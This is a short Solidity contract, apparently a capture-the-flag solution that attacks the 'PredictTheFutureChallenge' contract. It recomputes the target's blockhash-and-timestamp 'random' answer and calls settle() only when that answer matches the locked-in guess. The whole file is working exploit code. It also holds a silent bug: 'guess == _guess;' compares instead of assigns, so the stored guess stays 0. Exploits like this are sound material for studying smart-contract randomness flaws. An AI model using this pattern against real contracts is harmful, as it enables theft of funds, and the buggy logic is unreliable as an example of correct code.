pragma solidity ^0.4.21;

import '../PredictTheFutureChallenge.sol';

contract hackingPredictTheFutureChallenge {
    PredictTheFutureChallenge public original;
    uint8 guess;

    function hackingPredictTheFutureChallenge(address _contractAddress) public payable {
        original = PredictTheFutureChallenge(_contractAddress);
    }

    function lockInGuess(uint8 _guess) public payable {
        require(msg.value == 1 ether);
        guess == _guess;
        original.lockInGuess.value(msg.value)(_guess);
    }

    function answer(uint256 blockNumber) public view returns (uint8) {
        return uint8(keccak256(block.blockhash(blockNumber - 1), now)) % 10;
    }

    function exploit() public payable{
        require(answer(block.number) == guess);
        original.settle();
    }
    
}